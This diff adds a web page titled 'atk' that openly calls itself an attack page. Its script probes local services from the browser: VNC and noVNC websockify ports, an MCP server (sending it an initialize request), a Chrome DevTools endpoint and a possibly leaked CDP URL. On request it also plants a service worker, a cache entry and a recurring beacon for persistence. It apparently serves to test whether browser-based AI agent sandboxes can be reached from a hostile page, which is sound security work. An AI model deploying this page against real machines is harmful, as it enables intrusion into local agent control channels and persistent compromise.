@@ -1,0 +1,48 @@
+<!doctype html><meta charset=utf-8><title>atk</title><body>attack page
+<script>
+const q = new URLSearchParams(location.search);
+window.__results = {}; window.__done = false;
+function wsProbe(name, url, proto) {
+  return new Promise(res => {
+    let w, t = setTimeout(() => { try { w.close(); } catch (e) {} res(name, (window.__results[name] = "timeout")); }, 6000);
+    try { w = proto ? new WebSocket(url, proto) : new WebSocket(url); } catch (e) { clearTimeout(t); window.__results[name] = "throw:" + e.name; return res(); }
+    w.binaryType = "arraybuffer";
+    w.onopen = () => { window.__results[name] = "OPEN"; };
+    w.onmessage = ev => { const b = new Uint8Array(ev.data instanceof ArrayBuffer ? ev.data : new TextEncoder().encode(ev.data));
+      window.__results[name] = "OPEN+DATA:" + String.fromCharCode(...b.slice(0, 12)).replace(/\n/g, "\\n"); clearTimeout(t); w.close(); res(); };
+    w.onerror = () => { if (!window.__results[name]) window.__results[name] = "error"; };
+    w.onclose = ev => { if (!String(window.__results[name] || "").startsWith("OPEN+DATA")) window.__results[name] = (window.__results[name] || "") + " close:" + ev.code; clearTimeout(t); res(); };
+  });
+}
+async function fetchProbe(name, url, opts) {
+  const c = new AbortController(); const t = setTimeout(() => c.abort(), 6000);
+  try { const r = await fetch(url, Object.assign({ signal: c.signal }, opts)); const txt = await r.text();
+    window.__results[name] = "READ:" + r.status + ":" + txt.replace(/\s+/g, " ").slice(0, 80);
+  } catch (e) { window.__results[name] = "fail:" + e.name + ":" + String(e.message).slice(0, 80); } finally { clearTimeout(t); }
+}
+async function main() {
+  const probes = [
+    wsProbe("ws_6080_neo_novnc", "ws://127.0.0.1:6080/websockify", "binary"),
+    wsProbe("ws_localhost_6080", "ws://localhost:6080/websockify", "binary"),
+    wsProbe("ws_6081_viewer", "ws://127.0.0.1:6081/websockify", "binary"),
+    wsProbe("ws_5900_xvnc", "ws://127.0.0.1:5900/"),
+    wsProbe("ws_6090_unchecked_control", "ws://127.0.0.1:6090/websockify", "binary"),
+    fetchProbe("http_5900_xvnc", "http://127.0.0.1:5900/", { mode: "no-cors" }),
+    fetchProbe("mcp_9010_cors", "http://127.0.0.1:9010/mcp", { method: "POST",
+      headers: { "Content-Type": "application/json", "Accept": "application/json, text/event-stream" },
+      body: JSON.stringify({ jsonrpc: "2.0", id: 1, method: "initialize", params: { protocolVersion: "2025-03-26", capabilities: {}, clientInfo: { name: "atk", version: "0" } } }) }),
+    fetchProbe("claw_9210", "http://127.0.0.1:9210/", {}),
+    fetchProbe("cdp_9110_json", "http://127.0.0.1:9110/json/version", {}),
+  ];
+  if (q.get("cdp")) probes.push(wsProbe("ws_9110_cdp_leaked_url", q.get("cdp")));
+  await Promise.all(probes);
+  if (q.get("plant")) {
+    try { const reg = await navigator.serviceWorker.register("/sw.js", { scope: "/" }); await navigator.serviceWorker.ready; window.__results.sw = "registered:" + reg.scope; } catch (e) { window.__results.sw = "fail:" + e; }
+    try { const c = await caches.open("atk"); await c.put("/planted.js", new Response("PLANTED")); window.__results.cache = "put"; } catch (e) { window.__results.cache = "fail:" + e; }
+    setInterval(() => { localStorage.setItem("hb", String(Date.now())); fetch("/beacon?t=" + Date.now()).catch(() => {}); }, 1000);
+    window.__results.timer = "started";
+  }
+  window.__done = true;
+}
+main();
+</script>
